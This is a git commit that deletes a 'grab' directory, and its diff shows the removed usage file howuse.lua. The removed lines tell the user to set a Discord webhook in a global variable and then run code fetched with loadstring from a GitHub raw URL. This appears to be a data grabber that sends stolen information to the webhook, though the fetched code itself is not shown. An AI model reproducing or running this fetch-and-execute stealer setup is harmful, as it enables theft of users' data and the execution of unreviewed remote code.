bb369c34af1386a8f3d33458a78034fb501803c8
carter <81034605+carter-fr@users.noreply.github.com>
2021-12-27 21:56:20 -0700

    Delete grab directory

--- grab/howuse.lua
+++
@@ -1,5 +0,0 @@
--- to use this just put ur webhook into the value of _G.WebhookUrl and exec lol
-
-
-_G.WebhookUrl = "https://discordapp.com/<webhook>"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/grab/funny.lua"))()
